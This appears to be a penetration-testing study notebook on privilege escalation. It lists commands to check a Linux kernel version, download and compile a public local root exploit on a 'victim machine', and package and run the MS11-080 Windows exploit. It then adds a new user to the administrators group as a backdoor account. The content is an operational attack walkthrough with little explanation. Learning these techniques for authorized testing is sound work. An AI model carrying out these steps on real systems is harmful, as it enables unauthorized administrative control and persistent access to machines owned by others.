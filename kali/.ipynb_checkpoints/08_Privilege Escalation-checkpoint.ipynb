{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Linux root\n",
    "\n",
    "Check the OS version\n",
    "\n",
    "$ cat /etc/issue\n",
    "\n",
    "Check Kernel version\n",
    "\n",
    "$ uname -a\n",
    "\n",
    "\n",
    "Download the exploit to the victim machine\n",
    "\n",
    "$ wget -O exploit.c https://www.exploit-db.com/exploits/18411\n",
    "\n",
    "Compile the exploit to a binary file\n",
    "\n",
    "$ gcc exploit.c -o exploit \n",
    "\n",
    "Run the exploit\n",
    "#./exploit\n",
    "\n",
    "<img src=\"gcc_exploit.png\" align=\"middle\">\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Windows System\n",
    "\n",
    "Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080)\n",
    "\n",
    "Target OS : Windows XP , Windows Server 2003 \n",
    "\n",
    "\n",
    "Download the exploit\n",
    "\n",
    "$ wget -O 18176.py https://www.exploit-db.com/exploits/18176\n",
    "\n",
    "Convert python script to windows executable\n",
    "\n",
    "$ python pyinstaller.py --onefile 18176.py \n",
    "\n",
    "You will find the windows executable file in folder dist \n",
    "\n",
    "<img src=\"python_exploit.png\" align=\"middle\">\n",
    "\n",
    "Run windows executable to the victim machine\n",
    "\n",
    "<b>Add user</b>\n",
    "\n",
    "$ net user sherwin password /add\n",
    "\n",
    "<b>Add user to administrators group</b>\n",
    "\n",
    "$ net localgroup administrators sherwin /add"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
